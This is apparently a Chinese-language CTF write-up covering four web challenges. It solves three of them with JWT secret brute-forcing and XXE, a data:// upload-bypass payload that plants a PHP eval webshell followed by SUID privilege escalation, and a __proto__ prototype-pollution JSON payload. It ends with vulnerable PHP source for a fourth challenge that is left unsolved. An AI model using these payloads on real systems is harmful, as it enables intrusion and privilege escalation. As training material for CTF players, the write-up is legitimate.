<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668704692711-24576349-ada4-42f0-8310-8e858ac95cfe.png#averageHue=%238e8e8e&clientId=ucecd0ee9-26fc-4&from=paste&height=733&id=u544fe8e3&name=image.png&originHeight=916&originWidth=1108&originalType=binary&ratio=1&rotation=0&showTitle=false&size=58174&status=done&style=none&taskId=ua1217937-2b74-479b-9252-7da0c04927f&title=&width=886.4" alt="image.png"></p>
<h2 id="easygame"><a href="#easygame" class="headerlink" title="easygame"></a>easygame</h2><p>考点：JWT,XXE<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668704850194-96ff034d-34ed-4b74-83d5-06a5af7b8277.png#averageHue=%23e2bd82&clientId=ucecd0ee9-26fc-4&from=paste&height=104&id=u0e8f8cd2&name=image.png&originHeight=130&originWidth=584&originalType=binary&ratio=1&rotation=0&showTitle=false&size=8144&status=done&style=none&taskId=u642a793f-736e-4210-9536-5569ad35101&title=&width=467.2" alt="image.png"><br>跟着他的指引一路走好：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668704863657-db4f3551-70a4-45fc-8726-e1cdf354cd5b.png#averageHue=%23e3bc76&clientId=ucecd0ee9-26fc-4&from=paste&height=99&id=u8dbe125d&name=image.png&originHeight=124&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=29292&status=done&style=none&taskId=ub0a99961-319b-4053-b1e5-634cbafcd4f&title=&width=1536" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668704958134-6e6f8898-e8af-427d-b60c-9d7231a3b5fe.png#averageHue=%238c8c8c&clientId=ucecd0ee9-26fc-4&from=paste&height=792&id=u7c1e2d94&name=image.png&originHeight=990&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=54635&status=done&style=none&taskId=u2b171ddf-2aff-4095-b7ad-6757d79c519&title=&width=1536" alt="image.png"><br>这个一眼就知道是JWT,拖进JWT.IO分析一下：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668704894324-9a21e857-05fb-4191-a48f-ea5ff63ef610.png#averageHue=%23fdfdfc&clientId=ucecd0ee9-26fc-4&from=paste&height=669&id=u18a49c72&name=image.png&originHeight=836&originWidth=1543&originalType=binary&ratio=1&rotation=0&showTitle=false&size=97025&status=done&style=none&taskId=ud10050ca-a187-46a1-900a-3014a6bd2bb&title=&width=1234.4" alt="image.png"><br>浅显易懂，不过注意一下时间戳，这就是我们的deadline了，要不然提交会过期<br>然后现在要做的就是根据题目给的字典来爆破一下jwt是什么，写个py脚本：</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668705137855-1f007aad-b271-469f-ba6c-bf48cabdc407.png#averageHue=%23f8f7f6&clientId=ucecd0ee9-26fc-4&from=paste&height=383&id=u4ec20d29&name=image.png&originHeight=479&originWidth=1203&originalType=binary&ratio=1&rotation=0&showTitle=false&size=63309&status=done&style=none&taskId=u28ed4584-e93d-40e2-aaba-bc0084ecdff&title=&width=962.4" alt="image.png"><br>你不开始攻击他我可就要开始攻击你了<br>家人们跑脚本的时候对一下时间戳，否则就无了<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668705335503-dfe05b25-1884-499b-8217-7532ed1781cf.png#averageHue=%23f9f6f4&clientId=ucecd0ee9-26fc-4&from=paste&height=370&id=u8172589c&name=image.png&originHeight=462&originWidth=836&originalType=binary&ratio=1&rotation=0&showTitle=false&size=50722&status=done&style=none&taskId=ue7f4b83c-d9b8-4b4e-ba37-c0c26e88104&title=&width=668.8" alt="image.png"><br>哦欧克，解密一下：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668705365050-c9190099-9a4c-4589-81aa-68d1fc8a6da5.png#averageHue=%23222222&clientId=ucecd0ee9-26fc-4&from=paste&height=61&id=uad8f94fd&name=image.png&originHeight=76&originWidth=503&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5540&status=done&style=none&taskId=ue130337e-319b-4aef-a4ae-a2eea6ac042&title=&width=402.4" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668705377563-6af8de31-4b28-447a-bbf3-80cb09fbbf07.png#averageHue=%23f8f7f6&clientId=ucecd0ee9-26fc-4&from=paste&height=177&id=u31ecdda5&name=image.png&originHeight=221&originWidth=1203&originalType=binary&ratio=1&rotation=0&showTitle=false&size=18661&status=done&style=none&taskId=u4b36a48a-ec42-4230-8731-a8421e3cd30&title=&width=962.4" alt="image.png"><br>我觉得吧，这个一眼就是XXE注入：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668705506247-14ea6508-2741-4ef1-9a4e-d8aabe995b3e.png#averageHue=%23f8f8f8&clientId=u20f2e9a5-b002-4&from=paste&height=386&id=ucf32a772&name=image.png&originHeight=483&originWidth=1127&originalType=binary&ratio=1&rotation=0&showTitle=false&size=54285&status=done&style=none&taskId=u27efa258-fdda-4f6a-b3b1-5dc407f43cd&title=&width=901.6" alt="image.png"><br>这里唯一需要注意的就是application&#x2F;xml格式注意</p>
<h2 id="edit-php"><a href="#edit-php" class="headerlink" title="edit_php"></a>edit_php</h2><p>这一题就比较坑爹了，因为他源码藏的方式很肮脏<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668732514416-d8045565-aecc-483d-bf82-360b104b198b.png#averageHue=%23e8e8e8&clientId=u0e11289c-7500-4&from=paste&height=518&id=u66c8d67a&name=image.png&originHeight=648&originWidth=1915&originalType=binary&ratio=1&rotation=0&showTitle=false&size=161812&status=done&style=none&taskId=uf311b103-647b-4c0f-bc5b-22c47d04878&title=&width=1532" alt="image.png"><br>创建相册后就到这里了，然后期间有个跳转过程，是从CatchImg.php跳转到showimage.php，然后如果你在CatchImg界面不传参的话就会显示白盒代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;path&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: /index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$path</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;path&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">is_dir</span>(<span class="string">&#x27;upload/&#x27;</span>.<span class="variable">$path</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">mkdir</span>(<span class="string">&#x27;upload/&#x27;</span>.<span class="variable">$path</span>);</span><br><span class="line">        <span class="title function_ invoke__">chmod</span>(<span class="string">&#x27;upload/&#x27;</span>.<span class="variable">$path</span>,<span class="number">0755</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$uri</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$str</span>, <span class="number">5</span>);</span><br><span class="line">        <span class="variable">$checklist</span> = [<span class="string">&#x27;gif&#x27;</span>,<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>];</span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$uri</span>,<span class="title function_ invoke__">strpos</span>(<span class="variable">$uri</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>,<span class="variable">$checklist</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$uri</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file_url&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$contents</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file_url&#x27;</span>]);</span><br><span class="line">            <span class="variable">$ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file_url&#x27;</span>], <span class="title function_ invoke__">strrpos</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file_url&#x27;</span>], <span class="string">&quot;.&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">            <span class="variable">$uri</span> = <span class="title function_ invoke__">waf</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file_url&#x27;</span>]);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$uri</span> !== <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">                <span class="variable">$file_name</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$uri</span>,<span class="string">&#x27;&#x27;</span>==<span class="title function_ invoke__">strpos</span>(<span class="variable">$uri</span>,<span class="string">&#x27;/&#x27;</span>)?<span class="number">0</span>:<span class="number">1</span>,<span class="title function_ invoke__">strpos</span>(<span class="variable">$uri</span>,<span class="string">&#x27;.&#x27;</span>)-(<span class="string">&#x27;&#x27;</span>==<span class="title function_ invoke__">strpos</span>(<span class="variable">$uri</span>,<span class="string">&#x27;/&#x27;</span>)?<span class="number">0</span>:<span class="number">1</span>));</span><br><span class="line">                <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;upload/&#x27;</span>.<span class="variable">$path</span>.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$file_name</span>).<span class="string">&#x27;.&#x27;</span>.<span class="variable">$ext</span>,<span class="variable">$contents</span>);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no resource!&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: /index.php&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;refresh: 0;url=/showImage.php&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>我们审计一下就能发现，它存在一个waf以及一个读写过程</p>
<ul>
<li>parse_url：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;http://username:password@hostname:9090/path?arg=value#anchor&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>, PHP_URL_SCHEME));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>, PHP_URL_USER));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>, PHP_URL_PASS));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>, PHP_URL_HOST));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>, PHP_URL_PORT));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>, PHP_URL_PATH));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>, PHP_URL_QUERY));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>, PHP_URL_FRAGMENT));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">-----------------------------</span><br><span class="line">&lt;!-- <span class="keyword">array</span>(<span class="number">8</span>) &#123;</span><br><span class="line">  [<span class="string">&quot;scheme&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;http&quot;</span></span><br><span class="line">  [<span class="string">&quot;host&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">8</span>) <span class="string">&quot;hostname&quot;</span></span><br><span class="line">  [<span class="string">&quot;port&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">9090</span>)</span><br><span class="line">  [<span class="string">&quot;user&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">8</span>) <span class="string">&quot;username&quot;</span></span><br><span class="line">  [<span class="string">&quot;pass&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">8</span>) <span class="string">&quot;password&quot;</span></span><br><span class="line">  [<span class="string">&quot;path&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;/path&quot;</span></span><br><span class="line">  [<span class="string">&quot;query&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;arg=value&quot;</span></span><br><span class="line">  [<span class="string">&quot;fragment&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;anchor&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;http&quot;</span></span><br><span class="line"><span class="keyword">string</span>(<span class="number">8</span>) <span class="string">&quot;username&quot;</span></span><br><span class="line"><span class="keyword">string</span>(<span class="number">8</span>) <span class="string">&quot;password&quot;</span></span><br><span class="line"><span class="keyword">string</span>(<span class="number">8</span>) <span class="string">&quot;hostname&quot;</span></span><br><span class="line"><span class="keyword">int</span>(<span class="number">9090</span>)</span><br><span class="line"><span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;/path&quot;</span></span><br><span class="line"><span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;arg=value&quot;</span></span><br><span class="line"><span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;anchor&quot;</span> --&gt;</span><br></pre></td></tr></table></figure>
可以看到5对应的就是path了<br>之后就用substr和strpos去截取后缀名，这个截取的是第一个后缀名，必须在白名单内	<br>然后我们还要注意到strpos和strrpos，一开始没看到这个懵逼了，这2个前者是截取第一次出现，后者是截取最后一次出现的位置<br>然后在我们传入了之后<img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668734920792-9f0d5def-3056-4c7a-8041-46cb5b4b8479.png#averageHue=%23fefcfb&clientId=u0e11289c-7500-4&from=paste&height=50&id=ud8be0229&name=image.png&originHeight=62&originWidth=931&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7562&status=done&style=none&taskId=u63e10f64-97cd-46d0-b8b2-41e423aba31&title=&width=744.8" alt="image.png"><br>首先获取传入的文件的信息，这里可以用data写自定义内容<br>然后用strrpos获取最后的后缀名，这也就是个漏洞<br>我们payload<code>data://text/plain,1.png?&lt;?php eval($_POST[1]);?&gt;.php</code>就会把我们的木马写入$file_name里，$file_name是什么呢，我们不妨试一试：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668735161469-fed2b522-6430-46ed-b08c-5e1ded386118.png#averageHue=%23fbfaf9&clientId=u0e11289c-7500-4&from=paste&height=475&id=uf3310799&name=image.png&originHeight=594&originWidth=1241&originalType=binary&ratio=1&rotation=0&showTitle=false&size=80505&status=done&style=none&taskId=ub59a69cf-dc8d-441b-9a82-882aee23c35&title=&width=992.8" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668735480885-783ecc62-32b6-4379-9268-894271eaeb14.png#averageHue=%23fbfbd4&clientId=u0e11289c-7500-4&from=paste&height=95&id=u47783b6b&name=image.png&originHeight=119&originWidth=1235&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13431&status=done&style=none&taskId=u0f4f9168-3a79-4111-8a17-3b814458581&title=&width=988" alt="image.png"><br>可以看到第一个waf我们是过了的，然后ext肯定也会被截取为php，filename就是<code>/plain,1</code>我们md5加密一下<code>5e0cae35ba330954ea34a6746bae3b9e</code><br>所以最后会被放到：<code>/upload/13ef570a-d8fc-0c3b-2ffd-0f955e25c25b/5e0cae35ba330954ea34a6746bae3b9e.php</code>中，内容就是我们写的一句话木马：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668735624553-44e22b9e-1565-4a14-a932-f34b8fdc042f.png#averageHue=%23c6a572&clientId=u0e11289c-7500-4&from=paste&height=637&id=u09ddb830&name=image.png&originHeight=796&originWidth=1293&originalType=binary&ratio=1&rotation=0&showTitle=false&size=93777&status=done&style=none&taskId=ue8ec51ce-6774-4644-84e3-571b8474784&title=&width=1034.4" alt="image.png"><br>然后蚁剑上号，这里需要一个简单的提权：<br>首先先看看有s权限的有哪些<code>find / -perm -u=s -type f 2&gt;/dev/null</code>：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668735688676-38a5358b-48c8-4010-b643-8b4313bb2337.png#averageHue=%23090808&clientId=u0e11289c-7500-4&from=paste&height=206&id=u07bbadd8&name=image.png&originHeight=257&originWidth=1163&originalType=binary&ratio=1&rotation=0&showTitle=false&size=27860&status=done&style=none&taskId=ub6437d00-b80e-4c30-bc4a-deef868a691&title=&width=930.4" alt="image.png"><br>这边看到more有权限，那就直接用了<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668736014886-9383e60c-ccc7-445a-9e79-40fcbfee7f61.png#averageHue=%23212020&clientId=u0e11289c-7500-4&from=paste&height=102&id=u61ef899e&name=image.png&originHeight=128&originWidth=656&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10562&status=done&style=none&taskId=ue82a900d-2984-4676-a95e-e753eb35f9b&title=&width=524.8" alt="image.png"></li>
</ul>
<h2 id="cointowin"><a href="#cointowin" class="headerlink" title="cointowin"></a>cointowin</h2><p>考点：原型链污染<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668773550620-6664907b-b635-4124-bacd-3487fdf20a73.png#averageHue=%23374d62&clientId=uf00a874b-0505-4&from=paste&height=519&id=ubfd3b91b&name=image.png&originHeight=649&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=57053&status=done&style=none&taskId=u7cbd4d47-7392-43f4-9192-3a8f31a9c74&title=&width=1536" alt="image.png"><br>进去界面叫我们注册然后登入，启示给我们100-200元，但是flag要10000元<br>获取钱的方式给了一个，就是去赌博，赌狗的下场是什么不用我说了吧<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668773630721-3ad3738c-52b7-4958-8549-292a88762a2c.png#averageHue=%233a4e63&clientId=uf00a874b-0505-4&from=paste&height=303&id=u4c9100c0&name=image.png&originHeight=379&originWidth=1865&originalType=binary&ratio=1&rotation=0&showTitle=false&size=35324&status=done&style=none&taskId=u362dd902-86ce-41ea-b3cd-272b5d4c466&title=&width=1492" alt="image.png"><br>在导出界面看到了一些json格式的数据，盲猜一波原型链污染：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668773650109-2ef653cc-c99c-4118-b3a6-cb17e61992e0.png#averageHue=%233b5063&clientId=uf00a874b-0505-4&from=paste&height=341&id=u01b28ae2&name=image.png&originHeight=426&originWidth=1348&originalType=binary&ratio=1&rotation=0&showTitle=false&size=20709&status=done&style=none&taskId=u22248ccd-7dbb-47be-889f-35993fe3c61&title=&width=1078.4" alt="image.png"><br>在导入界面可以导入我们的json代码：<br><code>&#123;&quot;user&quot;:&quot;kino&quot;,&quot;coin&quot;:101,&quot;hashcode&quot;:&quot;c26522e2ec46bf2936678d4ee81d548a&quot;,&quot;__proto__&quot;:&#123;&quot;coin&quot;:100000000&#125;&#125;</code><br>如下添加一个原型去污染：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668773694211-b21eb006-839a-4a6b-8b2f-caee225bef7b.png#averageHue=%23f8f5f4&clientId=uf00a874b-0505-4&from=paste&height=423&id=ucf348d02&name=image.png&originHeight=529&originWidth=1273&originalType=binary&ratio=1&rotation=0&showTitle=false&size=78019&status=done&style=none&taskId=ude2e19ad-26aa-44d6-a400-f777f52c615&title=&width=1018.4" alt="image.png"><br>然后我们再注册一个号登入：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668773714544-ee218e89-09a0-4019-a921-153c52746349.png#averageHue=%23395064&clientId=uf00a874b-0505-4&from=paste&height=528&id=u8195e951&name=image.png&originHeight=660&originWidth=1349&originalType=binary&ratio=1&rotation=0&showTitle=false&size=79962&status=done&style=none&taskId=ua812923b-137c-46eb-9d20-df47f4d0df6&title=&width=1079.2" alt="image.png"><br>钱到手咯，去买flag咯：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668773722616-8b878000-42e5-48b5-ad87-56f4046e570f.png#averageHue=%2333485d&clientId=uf00a874b-0505-4&from=paste&height=182&id=ufded87bd&name=image.png&originHeight=227&originWidth=808&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9114&status=done&style=none&taskId=u4e915bec-00d3-410d-a637-db8e59372e0&title=&width=646.4" alt="image.png"></p>
<h2 id="Not-Stay"><a href="#Not-Stay" class="headerlink" title="Not_Stay"></a>Not_Stay</h2><p>注意url加一个<code>/</code>进入题目入口：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include_once</span>(<span class="string">&#x27;waf.php&#x27;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">uuid</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="variable">$chars</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">uniqid</span>(<span class="title function_ invoke__">mt_rand</span>(), <span class="literal">true</span>));  </span><br><span class="line">    <span class="variable">$uuid</span> = <span class="title function_ invoke__">substr</span> ( <span class="variable">$chars</span>, <span class="number">0</span>, <span class="number">8</span> ) . <span class="string">&#x27;-&#x27;</span></span><br><span class="line">            . <span class="title function_ invoke__">substr</span> ( <span class="variable">$chars</span>, <span class="number">8</span>, <span class="number">4</span> ) . <span class="string">&#x27;-&#x27;</span> </span><br><span class="line">            . <span class="title function_ invoke__">substr</span> ( <span class="variable">$chars</span>, <span class="number">12</span>, <span class="number">4</span> ) . <span class="string">&#x27;-&#x27;</span></span><br><span class="line">            . <span class="title function_ invoke__">substr</span> ( <span class="variable">$chars</span>, <span class="number">16</span>, <span class="number">4</span> ) . <span class="string">&#x27;-&#x27;</span></span><br><span class="line">            . <span class="title function_ invoke__">substr</span> ( <span class="variable">$chars</span>, <span class="number">20</span>, <span class="number">12</span> );  </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$uuid</span> ;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="variable">$safe_header</span> = <span class="string">&#x27;&lt;?php exit();?&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;path&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;path&#x27;</span>,<span class="title function_ invoke__">uuid</span>());</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$path</span> = <span class="string">&#x27;./upload/&#x27;</span>.<span class="variable">$_COOKIE</span>[<span class="string">&#x27;path&#x27;</span>].<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$path</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$path</span>);</span><br><span class="line">    <span class="title function_ invoke__">chmod</span>(<span class="variable">$path</span>,<span class="number">0755</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file_data</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;/tmp/&#x27;</span>.<span class="variable">$_COOKIE</span>[<span class="string">&#x27;path&#x27;</span>],<span class="variable">$file_data</span>);</span><br><span class="line">    <span class="variable">$file_type</span> = <span class="title function_ invoke__">exif_imagetype</span>(<span class="string">&#x27;/tmp/&#x27;</span>.<span class="variable">$_COOKIE</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file_type</span> != <span class="string">&quot;GIF&quot;</span> &amp;&amp; <span class="variable">$file_type</span> != <span class="string">&quot;PNG&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;nonono&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;I need data&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>,<span class="variable">$safe_header</span>.<span class="variable">$file_data</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;I need name&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
